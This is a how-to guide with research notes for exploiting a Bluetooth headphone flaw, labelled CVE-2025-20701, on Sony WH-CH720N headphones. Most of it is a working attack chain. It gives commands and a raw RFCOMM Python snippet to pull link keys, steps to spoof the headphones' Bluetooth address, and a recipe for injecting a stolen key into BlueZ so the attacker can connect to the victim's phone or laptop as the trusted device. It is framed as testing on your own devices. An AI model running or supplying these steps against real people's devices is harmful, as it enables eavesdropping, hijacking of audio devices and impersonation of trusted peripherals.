# Headphone Jacking on Asahi Linux

Quick guide to test CVE-2025-20701 (link key extraction) on your own devices.

## Prerequisites

```bash
# Install dependencies
sudo pacman -S bluez bluez-utils python python-pip

# Install race-toolkit
uv sync  # or: pip install -e .
```

## 1. Extract Credentials from Headphones

From any machine with BLE (including macOS):

```bash
# Get headphone BT address
uv run python race_toolkit.py -t bleak --le-names "WH-CH720N" bdaddr

# Get link keys for paired devices
uv run python race_toolkit.py -t bleak --le-names "WH-CH720N" link-keys
```

Note the address (e.g., `88:92:CC:1E:A0:00`) and link keys.

## 2. Spoof Bluetooth Address (Asahi)

```bash
# Check your adapter
hciconfig hci0

# Bring it down
sudo hciconfig hci0 down

# Spoof the headphone address
sudo bdaddr -i hci0 88:92:CC:1E:A0:00

# Bring it back up
sudo hciconfig hci0 up

# Verify
hciconfig hci0  # should show spoofed address
```

If `bdaddr` fails, try `spooftooph` or check if your chip supports it.

## 3. Inject Link Key

Find your target device's BT address (your laptop/phone). Then:

```bash
# Create directory for the pairing
sudo mkdir -p /var/lib/bluetooth/88:92:CC:1E:A0:00/<TARGET_ADDR>

# Create info file
sudo tee /var/lib/bluetooth/88:92:CC:1E:A0:00/<TARGET_ADDR>/info << EOF
[LinkKey]
Key=FB051E36C0B79677C7C8A839DD087307
Type=4
PINLength=0

[General]
Name=WH-CH720N
Class=0x240404
SupportedTechnologies=BR/EDR;
Trusted=true
Blocked=false
EOF

# Restart bluetooth
sudo systemctl restart bluetooth
```

Replace `<TARGET_ADDR>` with your laptop's BT address and use the correct link key.

## 4. Connect

```bash
bluetoothctl
> connect <TARGET_ADDR>
```

Your target device should accept the connection as if it's the trusted headphones.

## Troubleshooting

- **bdaddr doesn't work**: Your Bluetooth chip may not support address spoofing
- **Connection refused**: Try the other link key; you might have the wrong one
- **Need target's BT address**: Check `bluetoothctl devices` on the target, or look in its Bluetooth settings

---

## Research Notes (2026-01-01)

### Asahi Linux Findings

Tested on Asahi Linux (Fedora 42, kernel 6.16.4) with Apple Silicon's Broadcom Bluetooth adapter.

**What worked:**

1. **BLE scanning** via `bleak` works fine for device discovery
2. **RFCOMM RACE extraction** succeeded - the `bleak` GATT transport failed (no RACE GATT service exposed), but direct RFCOMM to the `Airoha_APP` service (channel 21) worked:
   ```python
   # Direct RFCOMM connection to extract link keys
   sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
   sock.connect(("88:92:CC:1E:A0:00", 21))  # Channel 21 = Airoha_APP
   # Send RACE GetLinkKey command: head=0x05, type=0x5A, length=2, id=0x0CC0
   sock.send(bytes.fromhex('055a0200c00c'))
   ```
3. **Address spoofing** works via Broadcom vendor HCI command:
   ```bash
   sudo hciconfig hci0 up
   sudo hcitool -i hci0 cmd 0x3F 0x001 0x00 0xA0 0x1E 0xCC 0x92 0x88
   # Address bytes reversed: 88:92:CC:1E:A0:00 → 00 A0 1E CC 92 88
   ```
4. **Link key injection** into BlueZ works as documented

**Issues encountered:**

- `bdaddr` tool not available in Fedora repos - use `hcitool cmd` instead
- Bumble's HCI socket transport doesn't work (Python lacks `AF_BLUETOOTH`)
- The race_toolkit's `bleak` transport couldn't connect initially - headphones must be disconnected from other devices first
- BLE GATT RACE service (CVE-2025-20700) was NOT exposed on WH-CH720N - possibly patched
- RFCOMM RACE service (CVE-2025-20701) IS still accessible

**Extracted from WH-CH720N:**
- 2 link keys successfully retrieved
- Device addresses in link key response may be uninitialized (seen as 00:00:00:00:XX:XX)

**Connection test:** Failed to connect to target phone - "page timeout" errors. Possible causes:
- Incorrect target address (link key addresses may not be reliable)
- Phone may have re-paired or removed the headphones
- Phone Bluetooth may need to be actively scanning
